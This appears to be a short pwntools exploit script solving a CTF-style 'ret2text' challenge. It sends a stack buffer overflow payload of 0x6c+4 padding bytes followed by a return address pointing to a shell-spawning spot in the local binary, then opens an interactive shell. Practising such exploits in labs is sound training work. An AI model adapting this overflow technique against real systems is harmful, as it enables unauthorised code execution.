from pwn import *

p = process('./ret2text')

bash_addr = 0x804863A

p.sendline(b'A' * (0x6c + 4) + p32(bash_addr))

p.interactive()

